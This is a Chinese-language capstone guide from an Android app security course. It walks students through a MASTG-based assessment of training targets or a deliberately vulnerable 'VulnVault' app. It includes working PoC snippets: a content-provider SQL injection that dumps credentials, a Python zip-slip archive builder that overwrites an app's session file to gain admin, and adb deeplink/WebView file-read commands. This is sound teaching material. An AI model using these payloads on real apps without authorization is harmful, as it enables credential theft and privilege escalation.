# Final Project — 完整 App 安全評估（MASTG 導向）

> **目標**：把這門課從 Ch 0 到 Ch 15 學的**全部**在同一個綜合靶上串成一次**業界標準的完整 App 安全評估**。以 OWASP **MASTG** 為稽核骨架，走過 **recon → 自動化掃描 → 逐類別手動驗證 → triage 去誤報 → 多個 PoC → 完整評估報告**。完成後你能證明的不是「每章分開會一招」，而是**能獨立拿一個綜合防護的 App，系統化地把它的攻擊面掃一遍、把可疑驗成可打、對齊 MASVS 需求編號，產出一份能放進作品集、客戶或 bug bounty 平台能直接用的評估報告**。這個 Final 要求整合本課 **≥70% 的核心概念**。

> **環境與合法邊界**：靶用 **AndroGoat + InsecureBankv2**（兩個併評，湊齊類別覆蓋），或一個你**自建的綜合靶**（規格見「任務規格」，自建保證你只評估自己有權分析的對象）。動態步驟需 **AVD（Android 13 / API 33，可 root）+ drozer + MobSF + Frida + jadx/apktool + apksigner + semgrep/mobsfscan/apkleaks + mitmproxy**。凡本 repo 沙箱跑不了的（drozer 打元件、Frida hook、MobSF 掃、抓包）標「**未實測，理論預期行為**」並給你自己環境的驗收方法；**CVSS 計算、semgrep 匹配、zip slip 構造/正規化防禦，用 Python 3.12 在本機實跑驗證，標「實際輸出」**。**這門課從頭到尾的紅線：只評估自己寫的、開源的、CTF 的、或明確授權（含有 scope 的 bug bounty）的目標。**

## 背景與動機

練習 C 你走過一次無加固靶的完整評估。這個 Final 的差別是三個「更」：**更全**（類別覆蓋要到 MASTG 的稽核廣度）、**更嚴**（每個結論對齊 MASVS 需求編號、每個 PoC 可複現）、**更大**（多個靶或一個綜合靶、多個 PoC、一份正式報告）。

這模擬的是真實的商業 App 安全評估——你不是「找一個炫洞」，是**在時限內系統化地把一個 App 的安全狀態評估清楚並寫成客戶能行動的報告**。真實評估的價值，80% 在流程的完整與報告的可執行性，20% 在你挖到的洞多漂亮。這個 Final 就是練那 80%。

為什麼以 MASTG 為骨架？因為它是**業界公認的行動 App 安全測試標準**。用它當骨架，你的報告從「個人手藝的展示」升級成「對齊國際標準的稽核」——客戶信得過、平台認得出、你自己也不會漏類別。這是把前十五章的零散技能，收攏成一套可交付、可重複、可信賴的**專業能力**的最後一步。

## 整合了本課哪些概念

這個 Final 動到的章節（覆蓋本課 ≥70% 的核心概念）：

| 階段 | 用到的能力 | 對應章節 |
|---|---|---|
| 前置 | 環境、方法論、MASVS/MASTG 骨架 | Ch 0, Ch 1 |
| 前置 | APK 結構、簽名 scheme、元件/IPC 模型 | Ch 2, Ch 2（IPC） |
| Recon | 攻擊面枚舉、Manifest 逆向、框架/防護判斷 | Ch 1, Ch 2 |
| 元件/IPC | exported 元件、intent redirection、PendingIntent 劫持 | Ch 3, Ch 4, Ch 5 |
| Provider | SQLi、path traversal、openFile、讀寫權限 | Ch 6 |
| 前端面 | deeplink/App Link 劫持、WebView RCE/檔洩漏、網路層 | Ch 7, Ch 8, Ch 9 |
| 資料/密碼 | 不安全儲存、crypto 誤用、secret 洩漏 | Ch 10, Ch 11, Ch 12 |
| 權限 | custom permission level、signature 誤用 | Ch 13 |
| 路徑/下載 | zip slip、path traversal、FileProvider 誤配 | Ch 14 |
| 自動化 | MobSF/semgrep/apkleaks、triage 去誤報 | Ch 15 |
| 收尾 | CVSS、報告撰寫、bug bounty 要點 | Ch 15 |

一眼可見：這個 Final 橫跨 Part 1（Ch 0-2）、Part 2（Ch 3-6）、Part 3（Ch 7-9）、Part 4（Ch 10-12）、Part 5（Ch 13-15）——**五個 Part 全部動到**。這就是「整合 ≥70%」的意思。

## 任務規格

### 目標選擇（二選一）

- **選項 A（推薦入門）**：**AndroGoat + InsecureBankv2 併評**。兩個開源靶合起來涵蓋幾乎全部類別（AndroGoat 偏元件/儲存/WebView，InsecureBankv2 偏網路/儲存/邏輯）。你把兩者當成「一次評估的兩個模組」，湊齊類別覆蓋。
- **選項 B（進階，最能練整合）**：**自建一個綜合靶** `VulnVault`（`com.example.vulnvault`），刻意埋入涵蓋下列類別的洞。自建的好處：你知道正確答案（能驗證你評得對不對），且保證合法。

### 自建靶 `VulnVault` 規格（選項 B）

一個「密碼保險箱」App，刻意埋入這些洞（每個對應課程能力）：

| 埋的洞 | 怎麼埋 | 對應章節 |
|---|---|---|
| exported Activity 觸發敏感畫面 | `LoginActivity` 之外的 `AdminActivity` 設 `exported=true` | Ch 3 |
| PendingIntent 劫持 | 用可變 PendingIntent 傳給第三方（Ch 5 的 confused deputy） | Ch 5 |
| exported Provider SQLi | `VaultProvider` 的 `selection` 字串拼接 | Ch 6 |
| deeplink → WebView 檔洩漏 | deeplink 帶 URL 直接餵給開了 JS + fileAccess 的 WebView | Ch 7, Ch 8 |
| 明文流量 + pinning 缺失 | `cleartextTrafficPermitted=true`，無 pinning | Ch 9 |
| 明文儲存憑證 | 密碼明文存 SharedPreferences | Ch 10 |
| crypto 誤用 | AES/ECB + 硬編碼 key | Ch 11 |
| 硬編碼 secret | `libvault.so` 或 strings 裡藏 API key | Ch 12 |
| custom permission 設錯 level | 保護 `AdminActivity` 卻用 `normal` 等級 | Ch 13 |
| zip slip | 「匯入保險箱備份」功能解壓 zip，naive 拼路徑 | Ch 14 |

> **建靶難度分級**：時間有限就先建「基本版」（只埋前 6 個洞），把主流程與報告練完；再加後 4 個埋成「完整版」。**基本版已覆蓋 ~60% 概念，完整版到 ≥70%。** 別在建靶上耗掉全部時間。或直接選選項 A 用現成靶。

### 你要交付的東西

1. **目標**（選 B 則含 `VulnVault` 原始碼 + APK；選 A 則說明用了哪兩個靶哪些版本）。
2. **一份完整評估報告**（用下方模板）——含類別總覽表、每個確定漏洞的完整條目、對齊 MASVS 需求編號。
3. **一套 PoC 集**：每個確定漏洞一個能複現的 PoC（drozer/adb/Frida/Python 重放/抓包），附真實輸出。
4. **一份 triage 紀錄**：自動化掃描原始命中 → 逐條判定 + 理由，證明去過誤報。
5. **一段執行摘要（executive summary）**：給非技術讀者的一頁摘要（發現幾個高危、整體風險等級、最優先修什麼）。

## 階段里程碑與每階段驗收

把整個 Final 切成七個里程碑。**每個里程碑有明確驗收，過了才進下一個**——這是 MASTG 方法論「分階段、有驗收」的實踐。

### 里程碑 0：建靶 / 選靶（Setup）

建出或選定目標，環境就緒。

**驗收**：App 能在 AVD 上跑；（選 B）每個埋的洞在 App 裡真的存在且可觸發；工具鏈（drozer/MobSF/Frida/semgrep）都能對這個 APK 動起來。

### 里程碑 1：Recon（對應 Ch 1/2）

把目標當「陌生 APK」，走完整偵察：

- `unzip -l` + `apktool d`：所有 exported 元件、權限、custom permission 與 level、`debuggable`/`allowBackup`、`network_security_config`、簽名 scheme。
- 判斷框架與有無加固。

**驗收**：一頁「攻擊面地圖」——完整 exported 元件清單 + 權限清單 + 值得注意的設定。**即使是自建靶（你知道答案），也要走一遍偵察流程**，練的是「拿到陌生 App 怎麼系統化偵察」。

### 里程碑 2：自動化掃描（對應 Ch 15）

MobSF + semgrep/mobsfscan + apkleaks 並行，掃出「疑似清單」。

**驗收**：三份原始掃描輸出到手。**此刻它們全是疑似，一個都還不是漏洞。**

### 里程碑 3：逐類別手動驗證 + PoC（對應 Ch 3-14）

按攻擊面優先序，逐類別手動驗證並做 PoC：

- **元件/IPC**（Ch 3/4/5）：`am start`/drozer 觸發 exported 元件；找 intent redirection、PendingIntent 劫持。
- **Provider**（Ch 6）：drozer `scanner.provider.*`、`content query` 試 SQLi/traversal。
- **deeplink/WebView**（Ch 7/8）：`am start -d` 餵惡意 URI，看 WebView 載不載入、能不能讀本地檔。
- **網路**（Ch 9）：mitmproxy 抓包看明文/pinning。
- **儲存/crypto/secret**（Ch 10/11/12）：`run-as`/root 拉私有檔看明文；逆 crypto；apkleaks 追 secret。
- **權限**（Ch 13）：custom permission level 對不對；能不能搶註冊。
- **路徑/下載**（Ch 14）：對「匯入備份」功能餵惡意 zip 試 zip slip。

**驗收**：每個確定漏洞都有精確指令 + 真實輸出的 PoC。

### 里程碑 4：triage（對應 Ch 15）

把里程碑 2 的掃描命中 + 里程碑 3 的手動發現匯總，逐條分流：確定/需條件/誤報 + 理由。

**驗收**：一份 triage 表；報告裡不出現任何「未經 triage 直接抄掃描器」的條目。

### 里程碑 5：評估嚴重度（對應 Ch 15）

對每個確定漏洞給 CVSS v3.1 向量 + 分數，對齊 MASVS 需求編號。

**驗收**：每漏洞有向量、分數、對應的 MASVS 編號（如 MASVS-STORAGE-1）。

### 里程碑 6：報告 + 執行摘要（對應 Ch 15）

用模板組成完整報告，加一頁執行摘要。

**驗收**：報告完整、每結論有證據鏈、陌生人能複現；執行摘要一頁講清整體風險與最優先修什麼。

## 期望輸出範例

里程碑 3 的 Provider SQLi PoC（**未實測，理論預期行為**——需 AVD/靶）：

```
$ adb shell content query --uri "content://com.example.vulnvault.provider/creds" \
    --where "1=1) UNION SELECT username, password FROM creds --"
Row: 0 username=alice, password=hunter2
Row: 1 username=bob,   password=letmein
   → 注入成功：任意 App 無需權限讀出全部明文憑證
```

里程碑 3 的 zip slip PoC（**惡意 zip 構造在本機實跑**）：

```python
# 構造惡意備份 zip，entry 逃出解壓目錄覆蓋 SharedPreferences
import zipfile, io
buf = io.BytesIO()
z = zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED)
z.writestr("backup.json", "{}")
z.writestr("../../../../data/data/com.example.vulnvault/shared_prefs/session.xml",
           "<map><string name=\"role\">admin</string></map>")
z.close()
print("evil.zip size:", len(buf.getvalue()), "entries:",
      zipfile.ZipFile(io.BytesIO(buf.getvalue())).namelist())
```

**實際輸出**（本機 Python 3.12 跑）：

```
evil.zip size: 377 entries: ['backup.json', '../../../../data/data/com.example.vulnvault/shared_prefs/session.xml']
```

那個 `../../../../` entry 原封不動存進 zip——餵給 naive 解壓的「匯入備份」功能，就把 `session.xml` 的 `role` 覆蓋成 `admin`（提權）。App 端是否真的覆蓋成功需在 AVD 上驗（`run-as` 看 `session.xml` 內容變了沒），但**惡意 zip 本身在本機已構造並驗證**。

里程碑 5 的 CVSS（**本機實跑**，與官方 NVD 計算器一致）：

```python
import math
def cvss(av,ac,pr,ui,s,c,i,a):
    AV={'N':0.85,'A':0.62,'L':0.55,'P':0.2}[av]; AC={'L':0.77,'H':0.44}[ac]
    PR_=({'N':0.85,'L':0.62,'H':0.27} if s=='U' else {'N':0.85,'L':0.68,'H':0.5})[pr]
    UI={'N':0.85,'R':0.62}[ui]
    C={'H':0.56,'L':0.22,'N':0}[c]; I={'H':0.56,'L':0.22,'N':0}[i]; A={'H':0.56,'L':0.22,'N':0}[a]
    iss=1-(1-C)*(1-I)*(1-A)
    impact=6.42*iss if s=='U' else 7.52*(iss-0.029)-3.25*(iss-0.02)**15
    expl=8.22*AV*AC*PR_*UI
    if impact<=0: return 0.0
    return math.ceil((min(impact+expl,10) if s=='U' else min(1.08*(impact+expl),10))*10)/10
print("Provider SQLi (本地)         ", cvss('L','L','N','N','U','H','N','N'))
print("PendingIntent 劫持(scope改變) ", cvss('L','L','N','N','C','H','H','N'))
print("deeplink->WebView 檔洩漏(遠端)", cvss('N','L','N','R','U','H','N','N'))
```

**實際輸出**：

```
Provider SQLi (本地)          6.2
PendingIntent 劫持(scope改變)  9.0
deeplink->WebView 檔洩漏(遠端) 6.5
```

三個分數的差異正是評估的精華：**PendingIntent 劫持因為 Scope 改變（跳出元件自身安全範圍）+ 完整性衝擊，飆到 9.0（Critical）**；Provider SQLi 雖能讀密碼但純本地讀取（`AV:L, S:U, I:N`）落 6.2；deeplink 攻擊是遠端但需使用者互動（`AV:N, UI:R`）落 6.5。你在報告裡填的分數要跟這一致，且**附向量**讓審閱者看懂你怎麼評的。

## 交付物一：評估報告模板

```markdown
# VulnVault 安全評估報告

## 執行摘要（Executive Summary）
- 評估對象 / 版本 / 日期 / 授權範圍
- 整體風險等級：<高/中/低> —— 一句話結論
- 發現統計：Critical x / High x / Medium x / Low x
- 最優先修復（Top 3）：...

## 1. 評估範圍與方法
- 目標、版本、環境（AVD API 33 x86_64）、授權聲明
- 方法：對齊 OWASP MASTG；工具：MobSF/drozer/Frida/semgrep/...
- 未評估項與原因（誠實標注時限/功能不存在）

## 2. 類別總覽表（對齊 MASVS）
| 類別 | MASVS 需求 | 結論 | 嚴重度 | 條目 |
|---|---|---|---|---|
| 元件暴露 | MASVS-PLATFORM-1 | 發現 | High | V-01 |
| 儲存 | MASVS-STORAGE-1 | 發現 | High | V-02 |
| ... | ... | 未發現/未評估 | — | — |

## 3. 漏洞詳情（每個確定漏洞一個條目）
### [V-01] <標題：元件 + 洞 + 後果>
- 影響 / CVSS（向量+分數）/ MASVS 需求
- 重現步驟（陌生人可照做）/ PoC（附真實輸出）/ 修復建議

## 4. triage 紀錄（附錄）
| 掃描來源 | 命中 | 判定 | 理由 |

## 5. 所有 PoC 腳本 / 命令（附錄）
```

## 交付物二：PoC 集骨架

每個確定漏洞配一個 PoC。範例（**未實測需 AVD，除標「本機實跑」者**）：

```bash
# V-01 exported Activity（Ch 3）
adb shell am start -n com.example.vulnvault/.AdminActivity   # 直接進管理畫面 = 有洞

# V-03 Provider SQLi（Ch 6）
adb shell content query --uri "content://com.example.vulnvault.provider/creds" \
    --where "1=1) UNION SELECT username, password FROM creds --"

# V-05 deeplink → WebView（Ch 7/8）
adb shell am start -a android.intent.action.VIEW \
    -d "vulnvault://open?url=file:///data/data/com.example.vulnvault/shared_prefs/session.xml"

# V-08 明文流量抓包（Ch 9）
#   mitmproxy 設為 AVD 的 proxy，觸發同步，看是否明文 HTTP

# V-10 zip slip（Ch 14）—— 惡意 zip 用上面「期望輸出」的 Python 構造，本機實跑
```

## 評分標準

用這張表自評（或同儕互評）。**滿分 100，70 及格代表你達到 Final 的整合與品質要求**：

| 維度 | 配分 | 評分要點 |
|---|---|---|
| **Recon 完整性** | 10 | 完整攻擊面地圖；不是憑感覺開掃 |
| **掃描覆蓋** | 8 | MobSF+semgrep+apkleaks 都跑，攻擊面掃全 |
| **類別覆蓋** | 15 | 五個 Part 的類別都有結論，覆蓋 ≥70% 概念 |
| **triage 品質** | 15 | 每條命中有判定+理由；誤報有記錄；非照抄掃描器 |
| **PoC 可重現** | 20 | 每個確定漏洞有能複現的 PoC+真實輸出；陌生人可照做 |
| **CVSS + MASVS 對齊** | 10 | 每漏洞有向量、分數、MASVS 編號；AV/Scope 判斷正確 |
| **報告品質** | 12 | 標題含後果、修復具體、結構完整、可交付 |
| **執行摘要** | 10 | 一頁講清整體風險、Top 3 優先修，非技術讀者看得懂 |

**加分項（各 +5，封頂 100）**：
- 做出至少一條**漏洞鏈**（如 exported Activity → intent redirection → WebView 載入攻擊者 URL，Ch 3+4+8），報告裡畫出鏈的影響。
- 把 triage 出的規則沉澱成可複用的 **semgrep 規則庫**（本課每類洞一條），下次一鍵掃。
- 把評估流程接進 **CI**（semgrep 跑在每次 build），示範攻防合流。
- 選項 B 自建靶並埋滿全部 10 個洞（完整版）。

## 如果你卡住了

1. **建靶就卡住**：改選選項 A 用 AndroGoat+InsecureBankv2，或先建 `VulnVault` 基本版（前 6 個洞）。別在建靶耗光時間，重點是評估流程與報告。
2. **MobSF 幾十條不知從哪 triage**：按攻擊面優先序（exported > Provider > deeplink/WebView > 儲存/secret > 其餘），從最可能高危的開始。
3. **分不清疑似與真漏洞**：判為真的唯一標準是**你做得出 PoC**。做不出就標「需條件」或「誤報」。
4. **PoC 自己能跑別人跑不出來**：重現步驟補上 AVD 版本、App 版本、前置狀態，寫到陌生人能照做。
5. **CVSS 分數對不上感覺**：99% 是 AV 或 Scope 判斷問題。本地另一 App 觸發是 `AV:L`；跳出元件安全範圍（如 WebView 拿系統能力、confused deputy）才是 `S:C`。回本機腳本重算。
6. **每類都想挖到洞卡在乾淨的類別**：沒洞就寫「未發現」+ 你怎麼查的。評估的價值也包含「這塊查過是乾淨的」。誠實的「未發現」比硬湊的假洞專業得多。

## 延伸挑戰（做完基本盤再玩）

1. **對齊完整 MASTG**：把報告的每個測試對齊 MASTG 的具體測試案例編號，讓它成為可稽核的正式評估——這是專業 App 安全公司交付報告的樣子。
2. **加加固再評一次**：給 `VulnVault` 加一層加固殼與反調試（接 `android_reversing` 的技能），體會「有加固時評估流程要多哪些步」——這正是通往 `android_exploitation` 的橋。
3. **鏈到後端**：apkleaks 撈到的 endpoint，若在授權 scope 內，把「App 洩漏 endpoint + secret」延伸成「打後端授權」的鏈——很多真實高賞金 bounty 是這樣鏈出來的。
4. **自動化整條評估**：用 MobSF REST API + 你的 semgrep 規則庫 + 自動 triage 腳本，把「拆一個 App」升級成「一鍵初評一批 App」。
5. **防禦視角回寫**：站在開發者角度，把你報告裡每個漏洞的修復實際實作進 `VulnVault`，重評確認修好了——攻防合流，這是最扎實的驗證。

## 自我檢核

- [ ] 我能不看引導，獨立走完 recon → 掃 → 手動驗證 → triage → CVSS → 報告的完整評估流程
- [ ] 我的報告覆蓋五個 Part 的類別，且我能把每類對應回課程章節（≥70% 概念）
- [ ] 我的每個確定漏洞都有能複現的 PoC + 真實輸出，陌生人能照做
- [ ] 我有 triage 紀錄，證明我判過誤報、不是照抄掃描器
- [ ] 我的每個漏洞有 CVSS 向量 + 分數 + MASVS 需求編號，且我能解釋 AV/Scope 為什麼那樣選
- [ ] 我寫了一頁執行摘要，非技術讀者能看懂整體風險與最優先修什麼
- [ ] 我能誠實區分「未發現」（查過乾淨）與「未評估」（沒查/超時限）
- [ ] 我全程只評估了自己有權分析的目標（自建/開源/授權）

## 延伸閱讀

### 完整方法論標準

- **[OWASP MASTG](https://mas.owasp.org/MASTG/) 與 [MASVS](https://mas.owasp.org/MASVS/)**
  - **讀哪裡**：MASTG 的 Android 各類測試案例，對照你這個 Final 的每個類別；MASVS 各需求編號，對照你報告的類別總覽表
  - **為什麼值得讀**：把你這個 Final 的「個人評估」升級成「對齊國際標準的稽核」——報告直接對齊 MASVS 需求編號，這是專業 App 安全評估報告的樣子。前提：本課全部。

### 報告與賞金

- **[HackerOne / Bugcrowd 報告撰寫與嚴重度指南](https://docs.hackerone.com/en/articles/8368821-submitting-reports)**
  - **讀哪裡**：高品質報告的要素、CVSS 與嚴重度、重現步驟要求
  - **為什麼值得讀**：你這個 Final 的報告若要拿去真實 bounty，這頁告訴你「什麼報告會被接受、什麼會被退」，照它打磨能大幅提高受理率。前提：本 Final。

### 頂級研究與下一步

- **[Oversecured blog](https://blog.oversecured.com/) 與 [Google Bug Hunters](https://bughunters.google.com/)**
  - **讀哪裡**：Oversecured 的真實 App 漏洞深度案例（PendingIntent、intent redirection、Provider）；Google Bug Hunters 的 Android scope 與已揭露報告
  - **為什麼值得讀**：這是把你的能力從「評估開源靶」推到「真實高價值目標」的地方——看世界頂級研究者怎麼把本課這些類別打成真實 CVE。前提：本課全部。

---

你走完了。從 Ch 0 建起一台能 root 的 AVD，到現在——你能拿一個綜合防護的 App，系統化地把它的攻擊面掃一遍，把「掃描器吐出的一坨疑似」triage 成「確定 + 證據」，對每個洞做出能複現的 PoC、給出對齊 MASVS 的嚴重度，最後寫出一份客戶或 bug bounty 平台能直接用的評估報告。這條鏈——**recon 枚舉攻擊面、自動化掃廣度、逐類別手動驗深度、triage 去噪音、PoC 證明可利用、報告溝通影響與修復**——就是一次真實 App 安全評估的縮影。

更重要的是，你不再是「工具驅動」或「打單點洞」的人。你腦中有 MASVS/MASTG 那張稽核地圖（Ch 1）、有從「可疑」到「可打」的驗證判斷力（全課）、有把技術發現寫成商業可行動報告的溝通力（Ch 15）。面對一個從沒見過的 App，你知道先看什麼、每個攻擊面怎麼系統化地查、掃描器的噪音怎麼濾、發現怎麼寫成別人能複現能修的報告。這才是這門課真正給你的東西——不是十五類漏洞的打法，是**把它們編排成一次完整、可交付、可信賴的專業評估的能力**。

接下來去哪？這門課練的是 **App 層**的漏洞評估——元件、IPC、WebView、儲存、權限、路徑。往下一層走，是**系統/native 利用**：Binder LPE、scudo/MTE、fuzzing、真實 CVE 研究。去 [android_exploitation](../android_exploitation/README.md)，把「找 App 層的洞」推進到「在系統與 native 層找沒人知道的洞並利用」。也回 [README 精選資料庫](./README.md) 的「讀完本課之後」——Oversecured 的頂級研究、Google Bug Hunters 的變現場，都是你下一階段的方向。地基已經打好，天花板在前面。

→ 回到 [課程首頁 README](./README.md) ／ 進階到 [android_exploitation](../android_exploitation/README.md)
